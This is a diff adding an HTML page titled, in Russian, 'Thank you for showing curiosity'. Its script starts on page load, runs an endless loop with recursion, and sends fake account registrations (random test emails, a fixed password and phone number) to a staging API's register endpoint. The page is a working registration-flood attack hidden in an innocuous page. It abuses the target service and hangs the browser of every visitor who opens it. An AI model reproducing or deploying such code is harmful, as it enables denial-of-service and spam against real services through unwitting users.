@@ -1,0 +1,60 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <title>Спасибо за проявленное любопытство</title>
+</head>
+
+<body>
+<div>
+    <h1>Спасибо за проявленное любопытство</h1>
+    <div id="count"></div> раз
+</div>
+<script>
+  'use strict'
+
+  async function send (user) {
+    console.log('user->email ', user.email)
+
+    let response = await fetch('http://api.development.vci-staging.piratecatleo.com/v1/auth/register', {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json;charset=utf-8'
+      },
+      body: JSON.stringify(user)
+    })
+
+    let result = await response.json()
+    alert(result.message)
+  }
+</script>
+<script type="application/javascript">
+  let i = 0
+  let getRandomInt = (max) => {
+    return Math.floor(Math.random() * Math.floor(max))
+  }
+
+  function start (i) {
+    while (++i) {
+      let numberRandom = i + getRandomInt(i * 10)
+      let user = {
+        email: `test${numberRandom}@test.com`,
+        password: 'qwe123',
+        phone: '+380997787988',
+        username: 'test1',
+      }
+
+      let result = send(user)
+
+      if (i % 2) {
+        start(i * 11)
+      }
+    }
+  }
+
+  start(i)
+
+</script>
+</body>
+
+</html>
+
